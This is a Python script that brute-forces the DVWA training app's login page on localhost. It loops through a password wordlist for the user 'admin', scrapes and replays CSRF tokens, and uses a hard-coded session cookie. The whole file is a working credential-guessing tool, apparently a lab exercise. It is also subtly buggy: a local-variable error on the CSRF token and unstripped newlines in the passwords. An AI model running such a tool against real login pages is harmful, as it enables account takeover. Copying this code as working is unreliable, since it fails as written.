from sys import argv
import requests
from bs4 import BeautifulSoup as Soup

def checking(html):
    soup = Soup(html)
    search = soup.findAll(text=success_message)
    if not search:
        success = False
    else:
        success = True
    return success

def bruteForce():
    with open(filename) as f:
        for password in f:
            payload = {'username': 'admin', 'password': password, 'Login': 'Login', 'user_token': csrf_token}
            r = s.get(url, cookies=cookie, params=payload)
            success = checking(r.text)
            if not success:
                soup = Soup(r.text)
                csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')
            else:
                return('Пароль: ' + password)
    return('Совпадений не найдено')


url = 'http://127.0.0.1/dvwa/vulnerabilities/brute/index.php'
cookie = {'security': 'Low', 'PHPSESSID':'eogppved743ckngeo0so6tnp87'}

script, filename, success_message = argv
txt = open(filename)

s = requests.Session()
target_page = s.get(url, cookies=cookie)
page_source = target_page.text
soup = Soup(page_source)
csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')

print(bruteForce())